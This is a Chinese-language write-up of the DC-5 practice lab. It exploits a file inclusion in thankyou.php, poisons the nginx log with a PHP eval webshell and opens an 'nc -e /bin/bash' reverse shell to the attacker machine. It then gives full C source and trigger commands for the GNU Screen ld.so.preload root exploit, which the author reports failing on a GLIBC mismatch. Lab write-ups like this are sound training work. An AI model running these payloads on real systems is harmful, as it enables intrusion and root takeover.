---
title: DC5
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-16T18:21:39+08:00
categories: 
- 渗透测试
- 靶机练习
---

```
arp-scan -l 
==> 192.168.121.148
```

得到目标IP开始进行信息收集，能够看到的有三个页面，contact页面下具有输入框，用于发送

nmap先扫描一下端口

![nmap](E:\笔记软件\笔记\渗透测试\靶机练习\DC5图库\nmap.png)

开放了三个端口，80,111,40225，其中111端口是rpcbind服务

**简单了解一下rpcbind**

rpcbind工具用于将RPC程序号码和通用地址互相转换。要让某主机能向远程主机的服务发起RPC调用， 则该主机上的rpcbind必须处于已运行状态。portmap进程一般使用TCP/UDP的111端口。rpcbind工具只能由super-user启动。

扫描一下目录，没有得到什么可用信息，再起一个漏扫看看![awvs](E:\笔记软件\笔记\渗透测试\靶机练习\DC5图库\awvs.png)

也没有得到什么有用的信息，决定对contact.php页面的输入框进行测试，抓包发现，参数直接由tankyou.php发送，而contact.php用于验证referer,参数直接包含在url中，先测试一下sql注入，其实并不抱太大希望，看了一下靶机提示，说是一些根据页面刷新而变动的东西，再次寻找一些信息，终于在thankyou.php页面，发现重复提交，页面下方的年份会发生变化，抓包没有发现返回逻辑，网页结构中存在一个footer.php，访问发现返回下部的加载框，并且是动态返回，因此，thankyou.php页面很有可能就是包含了footer.php这个页面，存在本地文件包含漏洞，尝试使用工具，调试编译环境，但是工具只能检测出静态参数目录，这里还是需要手动尝试

![include](E:\笔记软件\笔记\渗透测试\靶机练习\DC5图库\include.png)

可以看到利用file参数成功包含了index.php，把file参数丢到工具里面进行测试，![kadimus](E:\笔记软件\笔记\渗透测试\靶机练习\DC5图库\kadimus.png)

能够看到较多的有效路径，并且读取/etc/passwd成功，该工具能为我们提供reverse shell,可以尝试以下，一直连接失败，改用写入一句话木马，根据WP一直没法包含日志文件，尝试更新了以下环境，IP改为192.168.121.149,再次写马

```
<?php eval($_REQUEST[cmd]);?>
```

根据不同的日志文件，最后在/var/log/nginx/error.log处连接上蚁剑![蚁剑](E:\笔记软件\笔记\渗透测试\靶机练习\DC5图库\蚁剑.png)

但是我们还没有权限访问root目录，先获取shell

```
nc -e /bin/bash 192.168.121.135 7777
```

然后升级为交互式shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![shell](E:\笔记软件\笔记\渗透测试\靶机练习\DC5图库\shell.jpg)

无法使用sudo命令，但是可以使用find,使用find命令查找提权信息

```
find / -perm -u=s -type f 2>/dev/null
```

![find](E:\笔记软件\笔记\渗透测试\靶机练习\DC5图库\find.png)

看看有什么命令可以用于我们提权，发现screen可以在没有sudo的情况下提权，单独利用无果后搜寻exp

![exp](E:\笔记软件\笔记\渗透测试\靶机练习\DC5图库\exp.png)

按照所给exp中步骤编译两个文件

libhax.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

rootshell.c

```c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

```
gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc -o rootshell rootshell.c
```

分别进行编译，pyhon起一个http服务

```
python -m http.server 8000
```

在shell中获取这两个文件

```
wget http://192.168.121.135:8000/rootshell
wget http://192.168.121.135:8000/libhax.so
```

然后在目标靶机执行以下命令

```
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

即可成功提权root,但是当我执行最后一步rootshell提权时出现以下问题![last](E:\笔记软件\笔记\渗透测试\靶机练习\DC5图库\last.png)

上网查询是由于编译器版本问题，目标服务器上没有GLIBC_2.34,而攻击机使用GLIBC_2.34版本过高导致运行失败，直接上传41154.sh文件执行也报出该错误，暂时无法解决这个问题，最后再看一下是怎么得到file参数的，通过fuzz跑字典来得到

```
wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://192.168.121.149/thankyou.php?FUZZ=/etc/passwd
```

![file](E:\笔记软件\笔记\渗透测试\靶机练习\DC5图库\file.png)

至此该靶机告一段落

### 总结：

该靶机相较于DC1-4难度有所上升，比较困难的部分在于找到文件包含漏洞以及利用的问题，没有什么工具可以直接跑，还需要通过字典来判断接受的参数，比较考验做题人的观察能力；以及提权部分上传poc能否成功利用也是一个问题

